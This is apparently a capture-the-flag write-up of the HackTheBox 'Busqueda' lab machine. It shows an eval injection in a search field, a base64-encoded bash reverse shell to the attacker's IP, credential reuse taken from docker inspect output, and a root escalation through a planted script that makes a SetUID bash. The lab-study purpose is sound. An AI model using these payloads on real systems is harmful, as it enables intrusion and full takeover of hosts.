---
icon: ubuntu
---

# Busqueda - Easy

<figure><img src="../../.gitbook/assets/image (1882).png" alt="" width="75"><figcaption><p><a href="https://www.hackthebox.com/machines/busqueda"><strong>Busqueda</strong></a></p></figcaption></figure>

## Gaining Access

Nmap scan:

```
#Nmap TCP
nmap -A -T4 -p- -Pn 10.10.11.208 -oN scans/nmap-tcpall
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-17 16:25 EDT                                                                                     
Nmap scan report for searcher.htb (10.10.11.208)                                                                                                    
Host is up (0.034s latency).                                                                                                                        
Not shown: 65533 closed tcp ports (reset)                                                                                                           
PORT   STATE SERVICE VERSION                                                                                                                        
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)                                                                   
| ssh-hostkey:                                                                                                                                      
|   256 4f:e3:a6:67:a2:27:f9:11:8d:c3:0e:d7:73:a0:2c:28 (ECDSA)                                                                                     
|_  256 81:6e:78:76:6b:8a:ea:7d:1b:ab:d4:36:b7:f8:ec:c4 (ED25519)                                                                                   
80/tcp open  http    Apache httpd 2.4.52                                                                                                            
| http-server-header:                                                                                                                               
|   Apache/2.4.52 (Ubuntu)                                                                                                                          
|_  Werkzeug/2.1.2 Python/3.10.6                                                                                                                    
|_http-title: Searcher                                                                                                                              
Device type: general purpose                                                                                                                        
Running: Linux 4.X|5.X                                                                                                                              
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5                                                                                     
OS details: Linux 4.15 - 5.19                                                                                                                       
Network Distance: 2 hops                                                                                                                            
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel                                                                                             
                                                                                                                                                    
TRACEROUTE (using port 1025/tcp)                                                                                                                    
HOP RTT      ADDRESS                                                                                                                                
1   88.53 ms 10.10.16.1                                                                                                                             
2   26.82 ms searcher.htb (10.10.11.208)
```

<figure><img src="../../.gitbook/assets/image (1883).png" alt=""><figcaption></figcaption></figure>

Upon visiting we are meet with a redirect, I am going to update my /etc/hosts file

At the bottom of the page we get a version for Searchor

<figure><img src="../../.gitbook/assets/image (1885).png" alt=""><figcaption></figcaption></figure>

### Fuzzing for Command Injection on Search Function

I am going to FUZZ the query parameter and check to see how it behaves

I used burpsuite to grab the search request and used copy to file to save it.

<figure><img src="../../.gitbook/assets/image (1886).png" alt=""><figcaption></figcaption></figure>

Then used ffuf to test how it behaves against special characters

```
ffuf -request search.req -request-proto http -w ~/tools/SecLists/Fuzzing/special-chars.txt
```

<figure><img src="../../.gitbook/assets/image (1887).png" alt=""><figcaption></figcaption></figure>

Two special characters return nothing \[Size: 0] when they are passed in the POST request. I can confirm this by manually checking in Burp Suite, seeing that I get no response back when passing the single quote `‘` and back slash `\` characters:

<figure><img src="../../.gitbook/assets/image (1888).png" alt=""><figcaption></figcaption></figure>

The application is likely using some sort of function like eval() or print() that takes the user input: `eval('user_input')` I am going to test it

<figure><img src="../../.gitbook/assets/image (1889).png" alt=""><figcaption></figcaption></figure>

I got it to execute the print statement with the following

```
') print('hello')#
```

It has to be URL encoded for it to work

```
')%2bprint('hello')%23
```

### RCE via Command Injection

With RCE achieved, I can simply replace the query parameter value with a bash reverse shell. I’ll base64 encode the reverse shell to eliminate any special characters:

```
echo -n "bash -i  >& /dev/tcp/10.10.16.3/443  0>&1" | base64
```

<figure><img src="../../.gitbook/assets/image (1890).png" alt=""><figcaption></figcaption></figure>

The `-n` option in the `echo` command tells `echo` **not to print a newline** at the end of the output.

I’ll take the output from the above command and echo it, then base64 decode it, and pass it to bash. This will be the parameter value I enter in Burp Suite for my reverse shell:

```
echo -n "YmFzaCAtaSAgPiYgL2Rldi90Y3AvMTAuMTAuMTYuMy80NDMgIDA+JjE=" | base64 -d | /bin/bash
```

Additionally, I need to import the Python module ‘os’ to execute my command. The full parameter value I’ll pass in my POST request will be:

```
test')+__import__('os').system('echo -n "YmFzaCAtaSAgPiYgL2Rldi90Y3AvMTAuMTAuMTYuMy80NDMgIDA+JjE=" | base64 -d | /bin/bash')#
```

<figure><img src="../../.gitbook/assets/image (1891).png" alt=""><figcaption></figcaption></figure>

Before I forward the request I’ll first open a listener on my local machine to catch the reverse shell, and also URL encode the entire parameter value:

<figure><img src="../../.gitbook/assets/image (1892).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (1893).png" alt=""><figcaption></figcaption></figure>

## Privilege Escalation

We found some creds in svc home directory

<figure><img src="../../.gitbook/assets/image (1894).png" alt=""><figcaption></figcaption></figure>

The svc user's name has to be cody.

The website's code is located in `/var/www/app`:

<figure><img src="../../.gitbook/assets/image (1896).png" alt=""><figcaption></figcaption></figure>

The presence of the `.git` folder suggests this application is under version control using Git. The config is interesting:

<figure><img src="../../.gitbook/assets/image (1895).png" alt=""><figcaption></figcaption></figure>

There’s a reference to `gitea.searcher.htb`, and creds for the cody user. We can confirm this in the sites-enabled directory as well

<figure><img src="../../.gitbook/assets/image (1897).png" alt=""><figcaption></figcaption></figure>

Let's add it to the hosts file and check it out

```
10.10.11.208	searcher.htb gitea.searcher.htb
```

<figure><img src="../../.gitbook/assets/image (1898).png" alt=""><figcaption></figcaption></figure>

Cody's creds work, let's see if cody can run any commands as sudo now that we have his password

<figure><img src="../../.gitbook/assets/image (1899).png" alt=""><figcaption></figcaption></figure>

The permissions on this file are such that svc can’t read it, and can’t even execute it (in order to execute a script with an interpreter like Python, it must have read; an ELF binary would work fine this way):

<figure><img src="../../.gitbook/assets/image (1900).png" alt=""><figcaption></figcaption></figure>

I'll try with a random word at the end and see what happens:

<figure><img src="../../.gitbook/assets/image (1901).png" alt=""><figcaption></figcaption></figure>

There are three functions. `docker-ps` prints the output of what looks like the `docker ps` command:

<figure><img src="../../.gitbook/assets/image (1902).png" alt=""><figcaption></figcaption></figure>

There are two containers running.

`docker-inspect` wants a format and a container name:

<figure><img src="../../.gitbook/assets/image (1903).png" alt=""><figcaption></figcaption></figure>

The `docker inspect` command takes a container and [the docs](https://docs.docker.com/engine/reference/commandline/inspect/) show a `--format` option. This allows for selecting parts of the result. [This page of docs](https://docs.docker.com/config/formatting/) shows how the format works. If I pass it `{{ json [selector]}}` then whatever I give in selector will pick what displays. If I just give it `.` as the `selector`, it displays everything, which I’ll pipe into `jq` to pretty print:

```
sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect '{{json .}}' gitea | jq .
```

<figure><img src="../../.gitbook/assets/image (1904).png" alt=""><figcaption></figcaption></figure>

The environment section has the connection info for the DB, and there’s a password.

```
sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect '{{json .}}' mysql_db | jq .
```

<figure><img src="../../.gitbook/assets/image (1905).png" alt=""><figcaption></figcaption></figure>

Same in mysqldb container

The last option is `full-checkup`, but it just errors:

<figure><img src="../../.gitbook/assets/image (1906).png" alt=""><figcaption></figcaption></figure>

I’ll get the IP of the database by running the `system-checkup.py` script on the `mysql_db` container:

```
sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect '{{json .NetworkSettings.Networks}}' mysql_db | jq .
```

<figure><img src="../../.gitbook/assets/image (1907).png" alt=""><figcaption></figcaption></figure>

### Enumerating Database

```
mysql -h 172.19.0.3 -u gitea -pyuiu1hoiu4i5ho1uh gitea
```

<figure><img src="../../.gitbook/assets/image (1908).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (1909).png" alt=""><figcaption></figcaption></figure>

Before I try to crack the administrator’s password, I’ll see if it is reused from the database? Trying to log in with administrator:yuiu1hoiu4i5ho1uh works!

<figure><img src="../../.gitbook/assets/image (1910).png" alt=""><figcaption></figcaption></figure>

### s**ystem-checkup.py Source Analysis**

<figure><img src="../../.gitbook/assets/image (1911).png" alt=""><figcaption></figcaption></figure>

It is trying to run `full-checkup.sh` from the current directory. It failed before because that file didn’t exist.

### Exploiting&#x20;

I can put whatever I want into a `full-checkup.sh` and it will run as root if I start `system-checkup.py full-checkup` in the same directory.

I’ll have it copy `bash` and set my copy as SetUID to run as root:

```
echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/deimos\nchmod 4777 /tmp/deimos' > full-checkup.sh
```

```
chmod +x full-checkup.sh
```

<figure><img src="../../.gitbook/assets/image (1912).png" alt=""><figcaption></figcaption></figure>

I’ll run `system-checkup.py` and it reports success:

```
sudo python3 /opt/scripts/system-checkup.py full-checkup
```

<figure><img src="../../.gitbook/assets/image (1913).png" alt=""><figcaption></figcaption></figure>

/tmp/deimos is there, owned by root, and the s bit is on:

I’ll run with `-p` to not dop privs

<figure><img src="../../.gitbook/assets/image (1914).png" alt=""><figcaption></figcaption></figure>

And we are root!&#x20;
